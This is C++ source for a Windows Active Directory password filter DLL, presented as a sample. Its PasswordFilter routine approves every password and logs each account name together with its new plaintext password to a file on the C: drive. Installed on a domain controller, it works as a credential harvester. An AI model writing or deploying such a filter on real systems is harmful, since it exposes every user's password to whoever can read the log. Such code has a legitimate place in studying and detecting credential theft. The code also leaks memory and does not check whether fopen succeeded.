
//
// Sample AD Password Filter
// (c) 2009, Ondrej Sevecek
// www.sevecek.com
// ondrej@sevecek.com
//

#include <windows.h>
#include <winnt.h>
#include <stdio.h>
#include <ntsecapi.h>

#pragma warning(disable : 4996)

#define LOG_FILE "c:\\sevecekPWDfilter.txt"

//
//

void
Log(
	const char* str
	)
{
	__try
	{
		SYSTEMTIME localTime;

		ZeroMemory(&localTime, sizeof(localTime));
		GetLocalTime(&localTime);
		
		FILE* log;
		log = fopen(LOG_FILE, "a+");
		
		fprintf(
			log,
			"%04d/%02d/%02d %02d:%02d:%02d - %s\r\n",
			localTime.wYear,
			localTime.wMonth,
			localTime.wDay,
			localTime.wHour,
			localTime.wMinute,
			localTime.wSecond,
			str
			);

		fclose(log);
	}

	__except (EXCEPTION_EXECUTE_HANDLER)
	{
	}

	return;
}

//
//

BOOLEAN
__stdcall
InitializeChangeNotify(
	void
	)
{
	__try
	{
#ifdef DEBUG
		Log("InitializeChangeNotify()");
#endif
	}

	__except (EXCEPTION_EXECUTE_HANDLER)
	{
	}

	return TRUE;
}

//
//

NTSTATUS
__stdcall
PasswordChangeNotify(
	PUNICODE_STRING UserName,
	ULONG RelativeId,
	PUNICODE_STRING NewPassword
	)
{
	__try
	{
#ifdef DEBUG
		Log("PasswordChangeNotify()");
		Log("PasswordFilter() done.");
#endif
	}

	__except (EXCEPTION_EXECUTE_HANDLER)
	{
	}

	return 0;
}

//
//

BOOLEAN
__stdcall
PasswordFilter(
	PUNICODE_STRING AccountName,
	PUNICODE_STRING FullName,
	PUNICODE_STRING Password,
	BOOLEAN SetOperation
	)
{
	__try
	{
#ifdef DEBUG
		Log("PasswordFilter()");
#endif

		//
		//

		if (SetOperation)
		{
			Log("Performing RESET operation.");
		}

		//
		//

		{
			wchar_t* wszLogin = NULL;
			wszLogin = new wchar_t[AccountName->Length / 2 + 1];

			wcsncpy(wszLogin, AccountName->Buffer, AccountName->Length / 2);
			wszLogin[AccountName->Length / 2] = 0;

			LPSTR byteLogin = new CHAR[AccountName->Length / 2 + 1];
			sprintf(byteLogin, "%S", wszLogin);

			Log("Login:");
			Log(byteLogin);
		}

		//
		//

		{
			wchar_t* wszPassword = NULL;
			wszPassword = new wchar_t[Password->Length / 2 + 1];

			wcsncpy(wszPassword, Password->Buffer, Password->Length / 2);
			wszPassword[Password->Length / 2] = 0;

			LPSTR bytePwd = new CHAR[Password->Length / 2 + 1];
			sprintf(bytePwd, "%S", wszPassword);

			Log("Password:");
			Log(bytePwd);
		}

		//
		//

#ifdef DEBUG
		Log("PasswordFilter() done.");
#endif
	}

	__except (EXCEPTION_EXECUTE_HANDLER)
	{
	}

	return TRUE;
}

BOOL
APIENTRY
DllMain(
	HANDLE hModule, 
    DWORD  ul_reason_for_call, 
	LPVOID lpReserved
	)
{
	__try
	{
		switch (ul_reason_for_call)
		{
			case DLL_PROCESS_ATTACH:
				Log("DLL loaded.");
				break;

			case DLL_THREAD_ATTACH:
				break;

			case DLL_THREAD_DETACH:
				break;

			case DLL_PROCESS_DETACH:
				Log("DLL unloaded.");
				break;
		}
	}

	__except (EXCEPTION_EXECUTE_HANDLER)
	{
	}

	return TRUE;
}
